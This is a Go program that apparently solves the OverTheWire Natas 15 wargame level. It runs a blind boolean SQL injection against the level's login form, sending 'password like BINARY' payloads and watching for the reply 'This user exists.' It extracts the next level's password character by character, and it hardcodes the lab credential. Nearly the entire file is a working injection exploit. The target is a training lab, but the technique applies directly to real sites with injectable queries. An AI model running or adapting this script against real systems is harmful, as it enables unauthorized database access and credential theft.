package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"strconv"
	"strings"
)

var (
	username = "natas15"
	password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
	url_     = "http://natas15.natas.labs.overthewire.org/index.php"
	chars    = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	//url_ = "http://localhost/debug.php"
)

func main() {

	// şifre içerisinde geçen karakterler burada toplanacak
	match := ""
	for _, c := range chars {
		if pentest(`natas16 " and password like BINARY "%` + string(c) + `%" #`) {
			match += string(c)
		}
	}

	//şifre
	password := ""

	for i := 0; i < 30; i++ {
		for _, c := range match {
			if pentest(`natas16 " and password like BINARY "` + password + string(c) + `%" #`) {
				password += string(c)
				fmt.Println(password)
			}
		}
	}

	//fmt.Println(pentest(`" or 1=1 and username like 'natas16' #`))
}

func pentest(payload string) bool {
	client := &http.Client{}
	postData := url.Values{}
	postData.Set("username", payload)
	req, err := http.NewRequest("POST", url_, strings.NewReader(postData.Encode()))
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Add("Content-Length", strconv.Itoa(len(postData.Encode())))
	req.SetBasicAuth(username, password)
	if err != nil {
		log.Fatal(err)
	}

	res, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		log.Fatal(err)
	}

	//fmt.Println(payload)
	return strings.Contains(string(body), "This user exists.")

}
